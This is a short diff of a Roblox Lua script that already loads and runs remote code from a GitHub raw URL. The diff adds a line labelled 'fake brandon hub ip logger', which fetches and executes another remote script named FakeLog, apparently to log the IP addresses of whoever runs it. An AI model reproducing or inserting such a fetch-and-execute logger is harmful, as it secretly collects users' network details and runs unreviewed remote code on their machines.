@@ -19,3 +19,6 @@ else
     task.wait(1)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BH"))()
 end
+
+-- fake brandon hub ip logger
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
